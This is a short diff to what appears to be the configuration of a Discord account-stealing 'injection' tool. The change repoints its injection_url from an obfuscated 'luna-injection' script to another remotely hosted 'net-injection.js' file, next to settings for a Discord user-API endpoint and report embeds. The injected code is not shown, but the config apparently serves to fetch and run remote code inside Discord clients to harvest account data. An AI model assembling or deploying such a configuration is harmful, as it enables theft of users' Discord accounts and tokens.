@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Network Injection', 
   embed_icon: 'https://cdn.discordapp.com/attachments/1115372579939688548/1115373137295585410/net.png'.replace(/ /g, '%20'),
   embed_color: 5639644, 
-  injection_url: 'https://raw.githubusercontent.com/Smug246/luna-injection/main/obfuscated-injection.js', 
+  injection_url: 'https://raw.githubusercontent.com/Ryx07/net-injection/main/net-injection.js', 
 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
